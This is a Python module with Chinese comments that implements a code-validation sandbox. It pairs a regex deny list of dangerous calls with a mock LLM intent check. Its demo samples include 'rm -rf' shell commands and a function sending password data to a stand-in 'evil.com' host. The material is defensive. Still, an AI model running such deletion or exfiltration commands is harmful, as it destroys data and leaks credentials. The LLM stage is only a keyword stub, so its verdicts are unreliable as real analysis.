"""
模块名称: cognitive_sandbox.py
描述: 实现一个基于'认知自洽'原则的代码验证沙箱。

该沙箱旨在作为代码执行前的最后一道防线，通过结合静态规则分析和
大语言模型(LLM)的语义理解，确保生成的代码不仅语法正确，
而且在语义和意图上符合预设的价值观约束（如法律合规、安全性）。

核心概念:
- 认知自洽: 代码的意图必须与系统的价值观图谱保持逻辑一致。
- 价值观约束: 预定义的规则集，定义了什么是'允许的'和'禁止的'行为。
"""

import logging
import re
import json
import ast
from typing import List, Dict, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum

# 配置日志记录
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class RiskLevel(Enum):
    """风险等级枚举"""
    SAFE = 0
    LOW = 1
    MEDIUM = 2
    HIGH = 3
    CRITICAL = 4

@dataclass
class ValidationResult:
    """验证结果数据结构"""
    is_valid: bool
    risk_level: RiskLevel
    message: str
    violations: List[str] = field(default_factory=list)
    suggestions: List[str] = field(default_factory=list)

class ValueAlignmentGraph:
    """
    价值观对齐图谱 (模拟)
    在实际AGI系统中，这将是一个复杂的知识图谱。
    这里简化为一个规则引擎。
    """
    
    def __init__(self):
        # 硬性规则层
        self.prohibited_patterns = [
            (r'os\.system', "禁止直接调用系统Shell，存在注入风险"),
            (r'subprocess\.call', "禁止使用subprocess调用Shell命令"),
            (r'eval\(', "禁止使用eval()函数，存在代码注入风险"),
            (r'exec\(', "禁止使用exec()函数，存在代码注入风险"),
            (r'__import__', "禁止动态导入模块"),
            (r'requests\.get', "网络请求需经过合规性审查"), # 示例：限制网络访问
        ]
        
        # 软性/语义规则层 (由LLM辅助判断)
        self.semantic_constraints = [
            "必须尊重用户隐私，不得收集非必要数据",
            "必须遵守当地法律法规，不得进行未授权的爬取",
            "不得包含歧视性或有害内容"
        ]

    def check_syntax_and_imports(self, code: str) -> Tuple[bool, Optional[str]]:
        """
        辅助函数: 检查Python语法有效性和导入的模块
        """
        try:
            tree = ast.parse(code)
            imports = []
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    for alias in node.names:
                        imports.append(alias.name)
                elif isinstance(node, ast.ImportFrom):
                    if node.module:
                        imports.append(node.module)
            
            # 简单的边界检查：禁止某些危险库
            dangerous_libs = ['ctypes', 'multiprocessing', 'threading'] # 示例限制
            for lib in dangerous_libs:
                if lib in imports:
                    return False, f"禁止导入潜在危险的库: {lib}"
            
            return True, None
        except SyntaxError as e:
            logger.error(f"语法错误: {e}")
            return False, f"语法错误: {str(e)}"

class MockLLMClient:
    """
    模拟LLM客户端
    在生产环境中，这里会调用真实的LLM API (如GPT-4, Claude等)
    """
    
    def analyze_intent(self, code: str, constraints: List[str]) -> Dict[str, Any]:
        """
        模拟LLM分析代码意图与约束的冲突
        
        Args:
            code: 源代码
            constraints: 价值观约束列表
            
        Returns:
            包含分析结果的字典
        """
        logger.info("正在调用LLM进行深层语义分析...")
        
        # 模拟逻辑：如果代码包含特定关键词，则模拟违规
        mock_response = {
            "compliance_score": 0.95,
            "reasoning": "代码意图看似是数据处理，但包含网络请求。",
            "is_malicious": False
        }
        
        if "requests.get" in code and "password" in code:
            mock_response["compliance_score"] = 0.10
            mock_response["is_malicious"] = True
            mock_response["reasoning"] = "检测到尝试获取敏感凭证信息，违反隐私保护协议。"
            
        return mock_response

class CognitiveSandbox:
    """
    认知自洽代码验证沙箱
    
    整合规则引擎与LLM，对代码进行多维度验证。
    """
    
    def __init__(self):
        self.value_graph = ValueAlignmentGraph()
        self.llm_client = MockLLMClient()
        logger.info("认知沙箱初始化完成。")

    def _validate_rules(self, code: str) -> List[str]:
        """
        核心函数 1: 基于规则的验证
        执行快速、确定性的模式匹配和语法检查。
        """
        violations = []
        
        # 1. 语法检查
        is_valid_syntax, error_msg = self.value_graph.check_syntax_and_imports(code)
        if not is_valid_syntax:
            violations.append(f"[语法/结构错误]: {error_msg}")
            return violations # 语法错误直接终止
            
        # 2. 正则模式匹配 (黑名单)
        for pattern, reason in self.value_graph.prohibited_patterns:
            if re.search(pattern, code):
                violations.append(f"[规则违例]: 发现模式 '{pattern}' - {reason}")
                
        return violations

    def _validate_semantics(self, code: str, context: Dict[str, Any]) -> Tuple[bool, str]:
        """
        核心函数 2: 基于语义的验证
        利用LLM理解代码的高层意图和潜在风险。
        """
        # 提取上下文信息，例如用户的原始请求
        user_intent = context.get('user_intent', '通用编程任务')
        
        # 构造提示词 (实际场景中会更复杂)
        analysis = self.llm_client.analyze_intent(
            code, 
            self.value_graph.semantic_constraints
        )
        
        if analysis.get("is_malicious", False):
            return False, analysis.get("reasoning", "未知语义风险")
        
        # 设置合规阈值
        score = analysis.get("compliance_score", 1.0)
        if score < 0.7:
            return False, f"合规评分过低 ({score}): {analysis.get('reasoning')}"
            
        return True, "语义验证通过"

    def verify_code(self, code: str, context: Optional[Dict] = None) -> ValidationResult:
        """
        主入口函数: 执行完整的验证流程
        
        Args:
            code: 待验证的Python代码字符串
            context: 包含元数据的上下文字典，如 {'user_intent': '数据分析'}
            
        Returns:
            ValidationResult: 包含验证结果、风险等级和建议的对象
            
        Example:
            >>> sandbox = CognitiveSandbox()
            >>> code = "import os\\nos.system('rm -rf /')"
            >>> result = sandbox.verify_code(code)
            >>> print(result.is_valid)
            False
        """
        if not code or not isinstance(code, str):
            return ValidationResult(
                False, RiskLevel.CRITICAL, "输入代码为空或格式错误"
            )
            
        if context is None:
            context = {}
            
        logger.info("开始代码验证流程...")
        
        # 阶段 1: 规则层验证 (自上而下的约束)
        rule_violations = self._validate_rules(code)
        
        if rule_violations:
            logger.warning(f"规则验证失败: {rule_violations}")
            return ValidationResult(
                is_valid=False,
                risk_level=RiskLevel.HIGH,
                message="代码违反了硬性安全规则",
                violations=rule_violations,
                suggestions=["请移除危险函数调用，使用标准库替代。"]
            )
            
        # 阶段 2: 语义层验证 (认知自洽性检查)
        # 只有在规则层通过后，才进行昂贵的LLM调用
        is_semantic_safe, semantic_msg = self._validate_semantics(code, context)
        
        if not is_semantic_safe:
            logger.warning(f"语义验证失败: {semantic_msg}")
            return ValidationResult(
                is_valid=False,
                risk_level=RiskLevel.MEDIUM,
                message=f"认知自洽性检查失败: {semantic_msg}",
                suggestions=["请检查代码意图是否符合价值观约束。"]
            )
            
        # 通过所有检查
        logger.info("验证通过：代码符合认知自洽标准。")
        return ValidationResult(
            is_valid=True,
            risk_level=RiskLevel.SAFE,
            message="代码验证通过，符合安全与合规标准。",
            violations=[],
            suggestions=[]
        )

# 使用示例
if __name__ == "__main__":
    sandbox = CognitiveSandbox()
    
    # 示例 1: 危险代码
    dangerous_code = """
import os
def clean_disk():
    os.system('rm -rf /tmp/*')
"""
    print("--- 测试危险代码 ---")
    result = sandbox.verify_code(dangerous_code)
    print(f"结果: {result.message}")
    print(f"违规项: {result.violations}")
    
    print("\n" + "="*30 + "\n")
    
    # 示例 2: 语义违规
    semantic_violation_code = """
import requests
def get_data():
    # 尝试获取用户密码文件
    r = requests.get('http://evil.com/steal?data=password')
    return r.text
"""
    print("--- 测试语义违规 ---")
    # 给予上下文提示
    ctx = {"user_intent": "User requested data crawling"}
    result = sandbox.verify_code(semantic_violation_code, ctx)
    print(f"结果: {result.message}")

    print("\n" + "="*30 + "\n")

    # 示例 3: 安全代码
    safe_code = """
def calculate_sum(a: int, b: int) -> int:
    return a + b
"""
    print("--- 测试安全代码 ---")
    result = sandbox.verify_code(safe_code)
    print(f"结果: {result.message}")